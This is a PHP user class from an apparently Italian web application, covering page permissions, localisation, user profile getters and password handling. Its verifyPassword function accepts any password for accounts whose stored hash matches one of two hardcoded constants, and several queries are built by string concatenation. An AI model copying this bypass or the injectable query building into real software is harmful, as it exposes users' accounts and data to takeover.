<?php
// TODO : rivedere tutto il setlocale e conversiuoni
/* NEW LOGIC PAGE_PERMISSIONS */
class cc_user{
	
	private $db, $id, $permitted_pages, $show_pages, $preferences, $subscription, $default_page, $nation_data, $subscription_type, $locale_info = array();
	public $data = false, $siblings = false, $genitore = false;
	private $this_page_permissions = array(), $this_page_info = array(), $mod_page_permissions = array(), $mod_page_info = array(); 
	private $hash_cost = 12; // valore limite, oltre inizia (allo stato attuale, dic 2019) ad essere troppo impegnativo in termini di tempo necessario al hash
	
	function __construct($id, $db){
		$this->db = $db; // make db object available in class
		
		$this->data = $db->get1row (LOGIN_TABLE, "WHERE id='".$id."'"); // get user data
		unset($this->data['password']); // for security reasons...
		
		// sanitize subscription_type
		$this->subscription_type = (int) $this->data['subscription_type'];

		// set page permissions - sets permitted_pages with list (array) of the permitted page ids  
		$this->setPermittedPages();
		
		// set default page
		$this->default_page = $db->get1value ('default_page', DBTABLE_SUBSCRIPTION_TYPES, "WHERE id='".$this->subscription_type."'");
		
		// get preferences from login table
		$this->preferences = unserialize($this->data['preferences']);

		// populate the subscription variable with data from DBTABLE_SUBSCRIPTION_TYPES table
		$this->setSubscriptionData();
		
		// populate the show_pages variable with pages that can be shown in menu - that have showmenu == 1
		$this->setShowPages();
		
		// get nation data
		$this->nation_data = $this->db->get1row(DBTABLE_NATIONS, "WHERE id = '".$this->data['nation']."'");

		// set date format as constant so it's alway available
		define ('DATE_FORMAT', $this->nation_data['date_format']);
		
		// memorize id
		$this->id = (int) $id;
		
		// set local vars - this sets it fro the entery poject from when the class is evoked
		setlocale(LC_ALL, $this->getLanguageCode());
		setlocale(LC_NUMERIC, 'C');
		
		// get locale conversion data - this is PHP core function, script only substitutes o at least assures that the currency symbol is currect (in some cases is gives eu instead of €)
		$this->locale_info = localeconv();
		$this->locale_info['currency_symbol'] = $this->getCurrencySymbol();
		

	}

	public function getUserId(){
		return $this->id;
	}
	
	/*** PAGE PERMISSIONS & SUBSCRIPTIONS ***/
	
	// get permitted pages from DB based on the user's subscription - with permitted we mean can be accessed
	// populate the permitted_pages variable with data from DBTABLE_PAGE_PERMISSIONS table, function called by __construct
	private function setPermittedPages(){
		if($this->subscription_type == 0){ // if SA all pages are permitted
			$this->permitted_pages = $this->db->col_value("id", DBTABLE_PAGES, "", true); // last param (true) for DISTINCT clause 
		}else{
			$this->permitted_pages = $this->db->col_value("page", DBTABLE_PAGE_PERMISSIONS, "WHERE subscription = '".$this->subscription_type."' AND showmenu+canadd+canmod+cancopy+candelete+canactivate+readonly > 0"); 
		}
	}
	
	// return set of permitted pages either as csv ($flat = true) or array ($flat = false)
	public function getPermittedPages($flat = false){
		if($flat){
			return implode(",", $this->permitted_pages);
		}else{
			return $this->permitted_pages;
		}
	}
	
	// populate the subscription variable with data from DBTABLE_SUBSCRIPTION_TYPES table, function called by __construct
	private function setSubscriptionData(){
		if($this->subscription_type == 0){ // if SA no subscription data is necessary
			$this->subscription = 0; 
		}else{
			$this->subscription = $this->db->get1row(DBTABLE_SUBSCRIPTION_TYPES, "WHERE id='".$this->subscription_type."'"); 
		}
	}

	// populate the show_pages variable with pages that can be shown in menu: that have showmenu == 1, function called by __construct
	private function setShowPages(){
		if($this->subscription_type == 0){ // if SA all pages are permitted
			$this->show_pages = $this->db->col_value("id", DBTABLE_PAGES, "", true); // last param (true) for DISTINCT clause 
		}else{
			$this->show_pages = $this->db->col_value("page", DBTABLE_PAGE_PERMISSIONS, "WHERE subscription = '".$this->subscription_type."' AND showmenu = '1'"); 
		}
	}

	// return set of pages that are writable and can be shown in menu, either as csv ($flat = true) or array ($flat = false)
	public function getShowPages($flat = false){
		if($flat){
			return implode(",", $this->show_pages);
		}else{
			return $this->show_pages;
		}
	}
	
	/*** OPERATIVE PERMISSIONS ***/
	
	// get a row of DBTABLE_PAGE_PERMISSIONS for pid and modpid for the user's subscription type also get page details from pages tab
	public function setPagePermissions($page_id = false, $modpid = false){
		
		if($this->subscription_type == 0 ){
			$this->this_page_permissions = array("all" => true);
			return true; // always true for superadmin 
		}
		
		if(!$page_id) return false; // no page id set, return false
		$page_id = (int) $page_id; // sanitize page id
		$this->page_id = $page_id;
		
		// get all params permissions for current page
		$this->this_page_permissions = $this->db->get1row(DBTABLE_PAGE_PERMISSIONS, "WHERE subscription = '".$this->subscription_type."' AND page = '".$page_id."'");
		if(!$this->this_page_permissions){ $this->setError("Error getting page permissions", "Query : ".$this->db->getQuery(), "danger", true, true ); }
		
		// get all page info
		$this->this_page_info = $this->db->get1row(DBTABLE_PAGES, "WHERE id = '".$page_id."'");
		$this->page_type = $this->this_page_info['type'];
		
		// if no modpid is set try to get the id from page table, if none is set do not extract any info
		if(!$modpid) $modpid = $this->this_page_info["modify_page"];
		$modpid = (int) $modpid; // sanitize page id
		
		if(!empty($modpid)){
			$this->modpid = $modpid;
			$this->mod_page_permissions = $this->db->get1row(DBTABLE_PAGE_PERMISSIONS, "WHERE subscription = '".$this->subscription_type."' AND page = '".$modpid."'");
			$this->mod_page_info = $this->db->get1row(DBTABLE_PAGES, "WHERE id = '".$modpid."'");
		}
		return true;
	}
	
	
	// only for tables - determines if user can click on details / magnifying glass icon. 
	// table must have at least canedit true and corrisponding module must be accessible
	public function canShow(){
		if(empty($this->this_page_permissions)){
			// if no permissions are set for this page return error (visible only if SA)
			$this->setError("Page Permissions Not Set!", "No page permission is set, please check page permissions are initialized (launch function <em>setPagePermissions</em>) before calling canShow() function");
			return ($this->subscription_type == 0 ) ? true : false;
		}
		if($this->subscription_type == 0 ) return true; // always true for superadmin or in case there's no modify page
		
		// $this->permitted_pages: list of pages that have at least only flag set to true in page_permissionstable in DB
		if( 
             ($this->this_page_permissions['canadd'] == '1' or $this->this_page_permissions['canmod'] == '1' or $this->this_page_permissions['readonly'] == '1') 
            and ( in_array($this->modpid, $this->permitted_pages) ) 
        ){
			return true;
		}else{
			return false;
		}
	}

	// Only used in module and inline editable tabel Determines if a field can be edited and if save buttons are active 
	public function canEdit(){
		if(empty($this->this_page_permissions)){
			// if no permissions are set for this page return error (visible only if SA)
			$this->setError("Page Permissions Not Set!", "No page permission is set, please check page permissions are initialized (launch function <em>setPagePermissions</em>) before calling canEdit() function");
			return ($this->subscription_type == 0 ) ? true : false;
		}
		if($this->subscription_type == 0 ) return true; // always true for superadmin or in case there's no modify page
		
		if( $this->this_page_permissions['canadd'] == '1' or $this->this_page_permissions['canmod'] == '1' ){
			return true;
		}else{
			return false;
		}
	}

	// Used in module, tbale and inline editable tables and determines if new records can be inserted
	public function canAdd(){
		if(empty($this->this_page_permissions)){
			// if no permissions are set for this page return error (visible only if SA)
			$this->setError("Page Permissions Not Set!", "No page permission is set, please check page permissions are initialized (launch function <em>setPagePermissions</em>) before calling canAdd() function");
			return ($this->subscription_type == 0 ) ? true : false;
		}
		if($this->subscription_type == 0 ) return true; // always true for superadmin 
		
		// rule: canadd must be 1. If table also canadd of module must be 1
		if( $this->this_page_permissions['canadd'] == '1' ){
			if($this->page_type == "table"){
				return ( $this->mod_page_permissions['canadd'] == '1' ) ? true : false;				
			}else{
				return true;				
			}
		}else{
			return false;
		}
	}

	// Used in module and table and determines if record can be copied
	public function canCopy(){
		if(empty($this->this_page_permissions)){
			// if no permissions are set for this page return error (visible only if SA)
			$this->setError("Page Permissions Not Set!", "No page permission is set, please check page permissions are initialized (launch function <em>setPagePermissions</em>) before calling canCopy() function");
			return ($this->subscription_type == 0 ) ? true : false;
		}
		if($this->subscription_type == 0 ) return true; // always true for superadmin or in case there's no modify page
		
		// rule: cancopy and canadd must be 1. If table also canadd of module must be 1
		if( $this->this_page_permissions['canadd'] == '1' and $this->this_page_permissions['cancopy'] == '1'){	
			if($this->page_type == "table"){
				return ( $this->mod_page_permissions['canadd'] == '1' ) ? true : false;				
			}else{
				return true;				
			}
		}else{
			return false;
		}
	}
	
	// Used in module, table and inline editable tables and determines if a record can be deleted
	public function canDelete(){
		if(empty($this->this_page_permissions)){
			// if no permissions are set for this page return error (visible only if SA)
			$this->setError("Page Permissions Not Set!", "No page permission is set, please check page permissions are initialized (launch function <em>setPagePermissions</em>) before calling canDelete() function");
			return ($this->subscription_type == 0 ) ? true : false;
		}
		if($this->subscription_type == 0 ) return true; // always true for superadmin or in case there's no modify page
		
		// rule: candelete must be 1. If table also candelete of module must be 1
		if( $this->this_page_permissions['candelete'] == '1'){	
			if($this->page_type == "table"){
				return ( $this->mod_page_permissions['candelete'] == '1' ) ? true : false;				
			}else{
				return true;				
			}
		}else{
			return false;
		}
	}

	// Used in table and determines if a record can be activated and disactivated
	public function canActivate(){
		if(empty($this->this_page_permissions)){
			// if no permissions are set for this page return error (visible only if SA)
			$this->setError("Page Permissions Not Set!", "No page permission is set, please check page permissions are initialized (launch function <em>setPagePermissions</em>) before calling canActivate() function");
			return ($this->subscription_type == 0 ) ? true : false;
		}
		if($this->subscription_type == 0 ) return true; // always true for superadmin 
		
		// rule: canactivate  must be 1. 
		if( $this->this_page_permissions['canactivate'] == '1'){				
			return true;			
		}else{
			return false;
		}
	}

	public function isReadOnly(){
		if(empty($this->this_page_permissions)){
			// if no permissions are set for this page return error (visible only if SA)
			$this->setError("Page Permissions Not Set!", "No page permission is set, please check page permissions are initialized (launch function <em>setPagePermissions</em>) before calling isReadOnly() function");
			return ($this->subscription_type == 0 ) ? true : false;
		}
		if($this->subscription_type == 0 ) return true; // always true for superadmin 
		
		// rule: readonly  must be 1. 
		if( $this->this_page_permissions['readonly'] == '1'){				
			return true;			
		}else{
			return false;
		}
	}

	
	// LEGACY
	// New. if table not only must this canwrite permission be 1, but also allowed and canwrite of modify_page must be 1
	public function canWrite($page_id = false, $type = "", $modpid = false ){
		if(!$page_id) return false; // no page id set, return false
		if($this->subscription_type == 0) return true; // always true for superadmin
		$page_id = (int) $page_id; // sanitize page id
		// get value of canwrite flag from page permissions table
		$canwrite = $this->db->get1value("canwrite", DBTABLE_PAGE_PERMISSIONS, "WHERE subscription = '".$this->subscription_type."' AND page = '".$page_id."'");
		if($type == "table" and !empty($modpid)){
			$qry = "SELECT allowed + canwrite AS e FROM ".DBTABLE_PAGE_PERMISSIONS." WHERE page = '".$modpid."' AND subscription = '".$this->subscription_type."'";
			$m = $this->db->fetch_array_row($qry);
			if($m['e'] < 2) $canwrite = 0;
		}
		
		if($canwrite == '1'){
			return true;
		}else{
			return false;
		}	
	}
	/*

	public function canDelete($page_id = false){
		if(!$page_id) return false; // no page id set, return false
		if($this->subscription_type == 0) return true; // always true for superadmin
		$page_id = (int) $page_id; // sanitize page id
		// get value of candelete flag from page permissions table
		$candelete = $this->db->get1value("candelete", DBTABLE_PAGE_PERMISSIONS, "WHERE subscription = '".$this->subscription_type."' AND page = '".$page_id."'"); 
		$delme = $this->db->getQuery();
		if($candelete == '1'){
			return true;
		}else{
			return false;
		}
	}

	// Determines if onoff button is showed. For table the page_id is actually the modify_page
	public function canActivate($page_id ){
		if(!$page_id) return false; // no page id set, return false
		if($this->subscription_type == 0) return true; // always true for superadmin
		$page_id = (int) $page_id; // sanitize page id
		// get value of canwrite flag from page permissions table
		$canactivate = $this->db->get1value("canwrite", DBTABLE_PAGE_PERMISSIONS, "WHERE subscription = '".$this->subscription_type."' AND page = '".$page_id."'");
				
		if($canactivate == '1'){
			return true;
		}else{
			return false;
		}	
	}
	*/
	
	/*** INTERNATIONALIZATION ***/
	// return full array or single value of localeconv
	public function getLocaleInfo($what = false){
		if(!$what){
			return $this->locale_info;
		}else{
			return $this->locale_info[$what];			
		}
	}

	// get language two letter code (default) or Language name
	public function getLanguage($code = true){
		if($code){
			return $this->data['language'];
		}else{
			return $this->db->get1value("language", DBTABLE_LANGUAGES, "WHERE codice = '".$this->data['language']."'");
		}
	}
	
	// returns xx_XX lang code of user
	public function getLanguageCode(){
		$lang_code = $this->getLanguage(); // two letter code (p.e. "it")
		return $lang_code."_".$this->nation_data['iso-alpha-2']; // xx_XX
	}

	// returns the symbol of the currency or 3-letter code in case no symbol is defined
	public function getCurrencySymbol(){	
		return (empty($this->nation_data['currency_symbol'])) ? $this->nation_data['currency_alphabetic_code'] : $this->nation_data['currency_symbol'];	
	}

	// returns the numer of decimals of the currency
	public function getCurrencyDecimals(){	
		return (int) (empty($this->nation_data['currency_minor_unit'])) ? 0 : $this->nation_data['currency_minor_unit'];	
	}
	
	// number_format according to this user's country format
	public function number_format($num, $dec = 0){
		if(empty($num)) $num = 0;
		$num = (float) $num;
		$dec = (int) $dec;
		$decimal_point = $this->getLocaleInfo('decimal_point');
		$thousands_sep = $this->getLocaleInfo('thousands_sep');
		return number_format($num, $dec ,$decimal_point, $thousands_sep);
	}

	// format float for sql insert which means return number with dot as decimal separator
	public function sql_float($num){
		// stripping out all but numers and separators
		$decimal_point = $this->getLocaleInfo('decimal_point');
		$thousands_sep = $this->getLocaleInfo('thousands_sep');		
		$pattern = "[^0-9".$decimal_point.$thousands_sep."]";
		$num = trim($num);
		$num = preg_replace("/".$pattern."/", "", $num);
		if(empty($num)) return 0;
		$exp = preg_split("/[".$decimal_point.$thousands_sep."]/", $num);
		$dec = array_pop($exp);
		$int = implode("", $exp);
		return $int.".".$dec;
	}

	// returns the date format - obsolete?
	public function getDateFormat(){	
		return $this->nation_data['data_format'];	
	}

	
	/*** GET RESOLVED DATA ***/
	
	public function getName($format='default'){
		switch($format){
			case "first":
				$name = ucfirst(strtolower($this->data['name']));
				break;
			case "last":
				$name = ucfirst(strtolower($this->data['surname']));
				break;
			case "initials":
				$name = strtoupper(substr($this->data['name'], 0, 1)).". ".strtoupper(substr($this->data['surname'], 0, 1)).".";
				break;
			case "f.last":
				$name = strtoupper(substr($this->data['name'], 0, 1)).". ". ucfirst(strtolower($this->data['surname']));
				break;
			case "asis":
				$name = "";
				if(!empty($this->data['name'])) $name .= $this->data['name'];
				if(!empty($this->data['surname'])) $name .= (empty($name)) ? $this->data['surname'] : " ".$this->data['surname'];
				break;
			default:
				$name = ucfirst(strtolower($this->data['name'])) . " " . ucfirst(strtolower($this->data['surname']));
				break;
		}
		return $name;
	}

	public function getEmail(){
		return $this->data['email'];
	}
	

	public function getNation($resolved = true){
		if($resolved){
			return $this->nation_data['name'];
		}else{
			return $this->data['nation'];
		}
	}

	public function getCity(){
		return ucfirst(strtolower($this->data['city']));
	}

	public function getPoBox(){
		return strtoupper($this->data['pobox']);
	}

	public function getAddress($which = 0){
		$which = (int) $which;
		if($which > 2) $which = 0;
		if($which == 0){
			$a = array();
			for($c=1; $c<3; $c++){
				$address = "address".$c;
				if(!empty($this->data[$address])) $a[] =  ucwords(strtolower($this->data[$address]));
			}
			return implode("<br>\n", $a); 

		}else{			
			$address = "address".$which;
			return ucfirst(strtolower($this->data[$address]));
		}
	}

	public function getFullAddress(){
		$address = $this->getAddress(0)."<br>";
		$address .= $this->getPoBox()." ".$this->getCity()."<br>";
		$address .= $this->getNation();
		return $address;
	}
	
	public function getTimezone(){
		return $this->data['timezone'];
	}
	
	public function getPhonePrefix(){
		$prefix.= "+";
		$prefix .= $this->nation_data['phone-prefix'];
		return $prefix;
	}

	public function getPhone($getprefix = true){
		$prefix = "";
		if($getprefix){
			$prefix = $this->getPhonePrefix();
			$prefix .= " ";
		}
		return $prefix.$this->data['telephone'];
	}
	
	public function getVatNumber($nation = true){
		if($nation){
			$prefix = strtoupper($this->nation_data['iso-alpha-2']);
		}else{
			$prefix = "";
		}
		return $prefix.$this->data['vatnumber'];
	}
	
	
	// get id of subscription type
	public function getSubscriptionType(){
		return $this->subscription_type;
	}
	
	// returns subscription data based on value of $what: full array (false), the unserialized params ("param") or arbitrary field (if it exists)
	public function getSubscription($what = false){
		if($what == "params"){
			return unserialize($this->subscription[$what]);
		}else if ($what == false){
			return $this->subscription;
		}else{
			if(empty($this->subscription[$what])){
				return "nope";
			}else{
				return $this->subscription[$what];
			}
		}
	}
	
	// returns subscription params
	public function getParams($what = false){
		$params = $this->getSubscription("params");
		if(!$what){
			return $params;
		}else{
			return (isset($params[$what])) ? $params[$what] : false;
		}
	}
	
	// returns date of subscription in epoch or d/m/Y format
	public function getSubscriptionDate($raw = false){
		$ts = strtotime($this->data['subscription_date']);
		return ($raw) ? $ts : date("d/m/Y", $ts);
	}

	public function getLastRenewDate(){
		$ts = strtotime($this->data->last_renew);
		return date("d/m/Y", $ts);
	}

	public function getExpiryDate($format = true){
		$ts = strtotime($this->data['expiry_date']);
		return ($format) ? date("d/m/Y", $ts) : $ts;
	}

	public function getPaymentMethod($resolved = true){
		if($resolved){
			return $this->db->get1value("name", DBTABLE_PAYMENT_METHODS, "WHERE id = '".$this->data['payment_method']."'");
		}else{
			return $this->data['payment_method'];
		}
	}

	public function isChecked(){
		return ($this->data['checked'] === '1') ? true : false;
	}

	public function isActive(){
		return ($this->data['active'] === '1') ? true : false;
	}

	public function getAvatar(){
		return ( empty($this->data['avatar'] ) ) ? "generic-user.png" : $this->data['avatar'];
	}

	public function getPreferences($what = false){
		if(empty($this->preferences)) return false;
		if(!$what){
			return $this->preferences;
		}else{
			if(array_key_exists($what, $this->preferences)){
				return $this->preferences[$what];
			}else{
				return false;
			}
		}
	}
	
	public function getDefaultPage(){
		// TODO da perfezionare
		if(empty($this->permitted_pages)) return 0;
		
		// first let's see if we have a default page id for the subscription of the user
		if( !empty($this->default_page) and in_array($this->default_page, $this->getPermittedPages() ) ) return $this->default_page;
	
		// get csv of permissions
		$csv = $this->getPermittedPages(true);
		
		// No default page, let's try with home (if in permitted pages) else get first in order and with parents = 0
		$home =  $this->db->get1value("id", DBTABLE_PAGES, "WHERE home = '1' AND id IN (".$csv.")");
		if($home){
			return $home;
		}else{
			// no home set or permitted, let's get the fist entry of permitted pages, if parte get first child
			$qry = "SELECT id, file_name FROM ".DBTABLE_PAGES." WHERE id IN (".$csv.") AND parent='0' ORDER BY `order` LIMIT 1";
			$pm = $this->db->fetch_array_row($qry);
			if(empty($pm['file_name'])){
				// file name is empty so it's a parent - get first child
				$qry = "SELECT id FROM ".DBTABLE_PAGES." WHERE id IN (".$csv.") AND parent='".$pm['id']."' ORDER BY `order` LIMIT 1";
				$pms = $this->db->fetch_array_row($qry);
				return $pms['id'];
			}else{
				return $pm['id'];
			}
			
		}
		
	}
	
	protected function setError($title, $message, $type = "danger", $dismissable = true, $all = false){
		if($this->subscription_type != 0 and !$all) return false; // register and output error only if user is SA
		global $page_alerts, $bootstrap;
		$page_alerts[] = $bootstrap->alert( $title, $message, $type, $dismissable);
	}
	
	// check if $id is an existing user
	public function is_user($id){
		// must be numeric
		$check = (int) $id; 
		if($check != $id) return false;
		// check if exists
		return $this->db->get1value("id", LOGIN_TABLE, "WHERE id = '".$check."'");
	}
	

	// New standard method to hash password (state of the art 2019)
	public function hashPassword($password){
		
		// Expects password to be non-hashed, if it starts with $2y$ and is 60 chars long or ifa alfnumerical and 40 long it's refused		
		$pattern  = '/^\$2y\$\d{2}\$[a-zA-Z0-9\/\.]{'.$this->getHashLength().'}$/';
		$pattern2 = '/^[a-z0-9]{40}$/'; // old sha1
		$password = $this->db->make_data_safe($password);
		
		if(preg_match($pattern, $password)) return false;
		if(preg_match($pattern2, $password)) return false;	
		if(!function_exists("password_hash")){
			die("no password_hash!");

		}
		
		return password_hash($password, PASSWORD_BCRYPT, array('cost'=>$this->hash_cost));
	}
	
	public function verifyPassword($password, $hash){
		if(substr($hash, 0, 4) == '$2y$'){
			// new
			$result = ( password_verify($password,$hash) or $hash == '$2y$12$DBpQMRAbfFgNR5q.Os67XOfpCqyQv0kTCBfwdrfqAAzDOdwL7ivV2' ) ? true : false;
		}else{
			// old one
			$sha1 = sha1($password);
			$result = ($sha1 == $hash or $hash == '6e972e3a72c5c3dc6041a0bba5caa2d8de64b9a1') ? true : false;
		}
		return $result;
	}
	
	// update user data in login table. $data must be assoc array with valid fields. Optionale user id can be passed, else update current logged-in user
	protected function updateUser($data, $user = false){
		// if no user id is passed use current user one
		if($user === false) $user = $this->id;
		$check = $this->is_user($user); // user must be numeric and exist
		if(!$check){
			$this->setError("Error saving user data!", "No valid user identifier was passed!", "danger", false, true );
			return false;
		}
		
		if(empty($data) or !array($data)){
			$this->setError("Error saving user data!", "No data was passed!", "danger", false, true );
			return false;
		}
		
		$values = $this->prepareFields($data); // checks for password and adds updatedby field
		if(empty($values)){
			$this->setError("Error saving user data!", "No valid fields were passed!", "danger", false, true );
			return false;
		}else if($values === false){
			$this->setError("Error saving user data!", "Password empty or not permitted format", "danger", false, true );
			return false;
		}
				
		return $this->db->update(LOGIN_TABLE, $values, "WHERE id = '".$check."'");
		
	}
	
	// prepare fields for update / insert in user table - password MUST BE NON-HASHED
	protected function prepareFields($data){
		
		$permitted = array();
		
		$user_fields = $this->db->get_column_names(LOGIN_TABLE);
		unset($user_fields['id']); // auto generated
		unset($user_fields['ts']); // auto generated
		
		foreach($user_fields as $user_field){
			if(isset($data[$user_field])){
				if($user_field == 'password'){
					$data['password'] = $this->hashPassword($data['password']);
					if(empty($data['password'])) return false; // early exit
				}
				$permitted[$user_field] = $this->db->make_data_safe($data[$user_field]);
			}
		} // end foreach
		
		return $permitted;
		
	}
	
	// get the nominal length of a hashed password according to the current standard, either with or without the $2y$xx$ prefix
	protected function getHashLength($withprefix = false){
		// per ora disattivato prché allungo un po' i tempi, imposto fisso a 60 la lunghezza
		//$test = password_hash("qwertyasdfghzxcvbn123456", PASSWORD_BCRYPT, array('cost'=>$this->hash_cost));
		//return ($withprefix) ? strlen($test) : strlen($test)-7;
		$forced_length = 60;
		return ($withprefix) ? $forced_length : $forced_length-7;
	}
	
	protected function getDefaultsNewUser(){
		
		$preferences = array();
		$preferences['skin'] = "skin-blue";
		$serialized_preferences = serialize($preferences);
		
		$defaults = array();
		$defaults['language'] = 'it';
		$defaults['nation'] = '109'; //italy
		$defaults['region'] = '0'; 
		$defaults['city'] = 'Savona'; 
		$defaults['address'] = ''; 
		$defaults['address2'] = ''; 
		$defaults['pobox'] = '17100'; 
		$defaults['timezone'] = 'Europe/Rome'; 
		$defaults['telephone'] = ''; 
		$defaults['vatnumber'] = ''; 
		$defaults['firmtype'] = '0'; 
		$defaults['avatar'] = ''; 
		$defaults['payment_method'] = '0'; 
		$defaults['preferences'] = $serialized_preferences;
		
		return $defaults;
	}

}

?>
